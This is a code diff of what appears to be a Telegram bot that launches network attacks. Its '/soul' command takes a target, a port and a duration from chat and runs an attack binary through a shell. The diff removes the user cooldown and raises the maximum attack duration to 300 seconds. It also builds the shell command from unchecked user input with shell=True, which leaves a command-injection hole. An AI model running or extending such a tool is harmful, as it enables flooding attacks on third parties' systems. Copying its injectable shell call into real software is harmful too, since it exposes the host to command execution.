@@ -204,11 +204,6 @@ def handle_soul(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         if user_id not in admin_id:
-            
-            if user_id in soul_cooldown and (datetime.datetime.now() - soul_cooldown[user_id]).seconds < 3:
-                response = "You Are On Cooldown . Please Wait 5min Before Running The /soul Command Again."
-                bot.reply_to(message, response)
-                return
             # Update the last time the user ran the command
             soul_cooldown[user_id] = datetime.datetime.now()
         
@@ -217,13 +212,13 @@ def handle_soul(message):
             king = command[1]
             soulking = int(command[2])  
             time = int(command[3])  
-            if time > 181:
-                response = "Error: Time interval must be less than 80."
+            if time > 300:
+                response = "Error: Time interval must not be more than 300."
             else:
                 record_command_logs(user_id, '/soul_compiled', king, soulking, time)
                 log_command(user_id, king, soulking, time)
                 start_attack_reply(message, king, soulking, time)  
-                full_command = f"./soulcrack {king} {soulking} {time} 1024 900"
+                full_command = f"./soulfix {king} {soulking} {time} 1024 900"
                 subprocess.run(full_command, shell=True)
                 response = f"-漫~*'¨¯¨'*·舞~ 🇮🇳ąɬɬąƈƙ ƈơɱ℘Ɩɛɬɛɖ🇮🇳 ~舞*'¨¯¨'*·~漫- king: {king} soulking: {soulking} soulking: {time}"
         else:
